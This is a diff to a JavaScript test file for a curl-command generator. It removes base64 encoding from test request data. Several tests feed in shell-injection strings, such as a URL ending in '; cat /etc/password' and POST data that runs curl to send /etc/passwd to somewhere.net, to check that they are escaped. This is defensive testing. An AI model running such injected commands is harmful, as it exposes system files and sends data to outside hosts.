@@ -30,7 +30,7 @@ test('convertRequestToCurlCommand: simple POST', () => {
     method: 'POST',
     url: 'https://fbflipper.com/',
     requestHeaders: [],
-    requestData: btoa('some=data&other=param'),
+    requestData: 'some=data&other=param',
   };
 
   const command = convertRequestToCurlCommand(request);
@@ -46,7 +46,7 @@ test('convertRequestToCurlCommand: malicious POST URL', () => {
     method: 'POST',
     url: "https://fbflipper.com/'; cat /etc/password",
     requestHeaders: [],
-    requestData: btoa('some=data&other=param'),
+    requestData: 'some=data&other=param',
   };
 
   let command = convertRequestToCurlCommand(request);
@@ -60,7 +60,7 @@ test('convertRequestToCurlCommand: malicious POST URL', () => {
     method: 'POST',
     url: 'https://fbflipper.com/"; cat /etc/password',
     requestHeaders: [],
-    requestData: btoa('some=data&other=param'),
+    requestData: 'some=data&other=param',
   };
 
   command = convertRequestToCurlCommand(request);
@@ -76,7 +76,7 @@ test('convertRequestToCurlCommand: malicious POST URL', () => {
     method: 'POST',
     url: "https://fbflipper.com/'; cat /etc/password",
     requestHeaders: [],
-    requestData: btoa('some=data&other=param'),
+    requestData: 'some=data&other=param',
   };
 
   let command = convertRequestToCurlCommand(request);
@@ -90,7 +90,7 @@ test('convertRequestToCurlCommand: malicious POST URL', () => {
     method: 'POST',
     url: 'https://fbflipper.com/"; cat /etc/password',
     requestHeaders: [],
-    requestData: btoa('some=data&other=param'),
+    requestData: 'some=data&other=param',
   };
 
   command = convertRequestToCurlCommand(request);
@@ -106,9 +106,7 @@ test('convertRequestToCurlCommand: malicious POST data', () => {
     method: 'POST',
     url: 'https://fbflipper.com/',
     requestHeaders: [],
-    requestData: btoa(
-      'some=\'; curl https://somewhere.net -d "$(cat /etc/passwd)"',
-    ),
+    requestData: 'some=\'; curl https://somewhere.net -d "$(cat /etc/passwd)"',
   };
 
   let command = convertRequestToCurlCommand(request);
@@ -122,7 +120,7 @@ test('convertRequestToCurlCommand: malicious POST data', () => {
     method: 'POST',
     url: 'https://fbflipper.com/',
     requestHeaders: [],
-    requestData: btoa('some=!!'),
+    requestData: 'some=!!',
   };
 
   command = convertRequestToCurlCommand(request);
@@ -138,7 +136,7 @@ test('convertRequestToCurlCommand: control characters', () => {
     method: 'GET',
     url: 'https://fbflipper.com/',
     requestHeaders: [],
-    requestData: btoa('some=\u0007 \u0009 \u000C \u001B&other=param'),
+    requestData: 'some=\u0007 \u0009 \u000C \u001B&other=param',
   };
 
   const command = convertRequestToCurlCommand(request);
